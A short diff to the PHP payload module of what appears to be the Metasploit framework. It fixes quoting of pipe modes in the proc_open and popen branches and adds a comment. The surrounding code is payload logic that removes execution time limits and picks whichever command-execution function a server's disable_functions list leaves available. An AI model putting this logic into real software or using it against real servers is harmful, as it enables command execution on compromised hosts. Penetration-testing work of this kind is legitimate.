@@ -15,6 +15,8 @@ module Msf::Payload::Php
 
 		@dis = dis
 
+		# Canonicalize the list of disabled functions to facilitate choosing a
+		# system-like function later.
 		preamble = "
 			@set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);
 			#{dis}=@ini_get('disable_functions');
@@ -76,7 +78,7 @@ module Msf::Payload::Php
 			}else"
 		proc_open = "
 			if(#{is_callable}('proc_open')and!#{in_array}('proc_open',#{dis})){
-				$handle=proc_open(#{cmd},array(array(pipe,r),array(pipe,w),array(pipe,w)),$pipes);
+				$handle=proc_open(#{cmd},array(array(pipe,'r'),array(pipe,'w'),array(pipe,'w')),$pipes);
 				#{output}=NULL;
 				while(!feof($pipes[1])){
 					#{output}.=fread($pipes[1],1024);
@@ -85,7 +87,7 @@ module Msf::Payload::Php
 			}else"
 		popen = "
 			if(#{is_callable}('popen')and!#{in_array}('popen',#{dis})){
-				$fp=popen(#{cmd},r);
+				$fp=popen(#{cmd},'r');
 				#{output}=NULL;
 				if(is_resource($fp)){
 					while(!feof($fp)){
